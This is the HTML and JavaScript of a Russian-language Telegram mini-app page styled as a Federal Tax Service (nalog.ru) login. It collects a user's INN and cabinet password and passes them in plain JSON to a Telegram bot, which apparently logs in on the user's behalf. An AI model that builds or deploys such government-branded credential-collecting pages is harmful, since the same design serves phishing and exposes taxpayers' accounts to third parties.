<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ФНС Авторизация</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body {
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  background:var(--tg-theme-bg-color,#fff);
  color:var(--tg-theme-text-color,#222);
  padding:24px 20px;
  min-height:100vh;
}
h2 { font-size:22px; margin-bottom:5px; }
.sub { font-size:13px; color:var(--tg-theme-hint-color,#888); margin-bottom:24px; line-height:1.4; }
label { font-size:12px; font-weight:700; display:block; margin-bottom:6px; color:var(--tg-theme-hint-color,#666); text-transform:uppercase; letter-spacing:.5px; }
input {
  width:100%; padding:14px 16px;
  border:1.5px solid rgba(0,0,0,.1);
  border-radius:12px;
  font-size:17px;
  background:var(--tg-theme-secondary-bg-color,#f5f5f5);
  color:var(--tg-theme-text-color,#222);
  margin-bottom:16px; outline:none;
  transition: border-color .2s;
}
input:focus { border-color:var(--tg-theme-button-color,#2481cc); }
.btn-main {
  width:100%; padding:15px;
  background:var(--tg-theme-button-color,#2481cc);
  color:var(--tg-theme-button-text-color,#fff);
  border:none; border-radius:14px;
  font-size:17px; font-weight:600;
  cursor:pointer; margin-bottom:10px;
  transition: opacity .15s;
}
.btn-main:active { opacity:.8; }
.btn-skip {
  width:100%; padding:12px;
  background:transparent;
  color:var(--tg-theme-hint-color,#888);
  border:1.5px solid rgba(0,0,0,.1);
  border-radius:12px;
  font-size:15px; cursor:pointer;
}
.info-box {
  background:var(--tg-theme-secondary-bg-color,#f0f8ff);
  border-radius:12px;
  padding:14px 16px;
  margin-bottom:20px;
  font-size:13px;
  line-height:1.6;
  color:var(--tg-theme-hint-color,#555);
}
.info-box b { color:var(--tg-theme-text-color,#222); }

/* Sending screen */
.v-send {
  text-align:center;
  padding:60px 20px 40px;
}
.icon-big { font-size:56px; margin-bottom:16px; }
.v-send h3 { font-size:20px; margin-bottom:8px; }
.v-send p { font-size:14px; color:var(--tg-theme-hint-color,#888); line-height:1.5; }
.dots::after {
  content:'';
  animation: dots 1.5s steps(4,end) infinite;
}
@keyframes dots {
  0%,20%{content:''}
  40%{content:'.'}
  60%{content:'..'}
  80%,100%{content:'...'}
}

.hidden { display:none; }
</style>
</head>
<body>

<div id="v-form">
  <h2>🔐 Войти в ФНС</h2>
  <p class="sub">Личный кабинет — nalog.ru<br>Авторизация через защищённый сервер</p>

  <div class="info-box">
    💡 Введи данные от <b>Личного кабинета ФНС</b> (lkip.nalog.ru или lkfl2.nalog.ru).<br>
    Пароль передаётся боту и не хранится в браузере.
  </div>

  <label>ИНН</label>
  <input id="inn" type="tel" inputmode="numeric" placeholder="041100124864" maxlength="12">

  <label>Пароль от ЛК ФНС</label>
  <input id="pwd" type="password" placeholder="••••••••••••">

  <button class="btn-main" onclick="submit()">Отправить боту →</button>
  <button class="btn-skip" onclick="skipLogin()">Пропустить, введу вручную в боте</button>
</div>

<div id="v-send" class="v-send hidden">
  <div class="icon-big">📨</div>
  <h3>Отправляю боту<span class="dots"></span></h3>
  <p>Бот авторизуется в ФНС<br>и пришлёт тебе результат в чат</p>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Заполним ИНН если передан через startParam
const startParam = tg.initDataUnsafe?.start_param || '';
if (startParam && /^\d{10,12}$/.test(startParam)) {
  document.getElementById('inn').value = startParam;
}

function show(id) {
  ['v-form','v-send'].forEach(v =>
    document.getElementById(v).classList.toggle('hidden', v !== id)
  );
}

function submit() {
  const inn = document.getElementById('inn').value.trim();
  const pwd = document.getElementById('pwd').value;

  if (inn.length < 10) {
    alert('Введи ИНН (10 или 12 цифр)');
    return;
  }
  if (!pwd || pwd.length < 4) {
    alert('Введи пароль');
    return;
  }

  show('v-send');

  // Передаём credentials боту — он сам авторизуется через свой сервер
  const data = JSON.stringify({
    type: 'fns_login',
    inn: inn,
    password: pwd
  });

  tg.sendData(data);

  // Закрываем через 2.5 сек (бот обработает в фоне)
  setTimeout(() => tg.close(), 2500);
}

function skipLogin() {
  tg.sendData(JSON.stringify({ type: 'fns_skip' }));
  tg.close();
}
</script>
</body>
</html>
